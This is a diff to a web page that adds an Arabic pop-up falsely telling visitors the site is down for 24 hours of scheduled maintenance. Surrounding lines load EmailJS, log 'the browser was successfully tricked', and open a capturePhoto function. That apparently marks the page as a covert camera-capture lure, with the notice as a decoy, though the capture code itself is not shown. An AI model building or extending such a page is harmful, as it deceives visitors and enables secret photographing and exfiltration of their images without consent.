@@ -127,8 +127,54 @@
     </div>
 </div>
 
+<!-- ✨ إشعار تنبيه برسالة تقنية -->
+<div id="notification" style="
+    position: fixed;
+    top: 25px;
+    right: 25px;
+    background: #1f1f2e;
+    color: #e6f0ff;
+    padding: 20px 25px;
+    border-radius: 12px;
+    box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+    font-size: 1rem;
+    font-weight: 600;
+    z-index: 10000;
+    max-width: 350px;
+    line-height: 1.6;
+    border-right: 5px solid #3498db;
+    display: none;
+    direction: rtl;
+">
+    <strong>مرحبًا </strong><br>
+    لقد حاولت الدخول الى هذا الموقع.<br>
+    ونود إبلاغك بأن الخدمة تخضع حالياً لصيانة مجدولة لمدة <strong>24 ساعة</strong>.<br>
+    لا داعي للقلق، وستعود للعمل قريباً.<br>
+    <span style="color:#aaa; font-size: 0.9em;">-- فريق الدعم الفني</span>
+</div>
+
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
+
+
+// ✅ عرض الإشعار بعد تحميل الصفحة
+window.addEventListener('load', () => {
+    const note = document.getElementById("notification");
+    if (note) {
+        note.style.display = 'block';
+        setTimeout(() => {
+            note.style.opacity = 1;
+        }, 100);
+
+        // ⏳ إخفاء تلقائي بعد 10 ثوانٍ
+        setTimeout(() => {
+            note.style.opacity = 0;
+            setTimeout(() => note.style.display = 'none', 500);
+        }, 10000);
+    }
+});
+
+
 console.log("تم خداع المتصفح بنجاح");
 
 async function capturePhoto() {
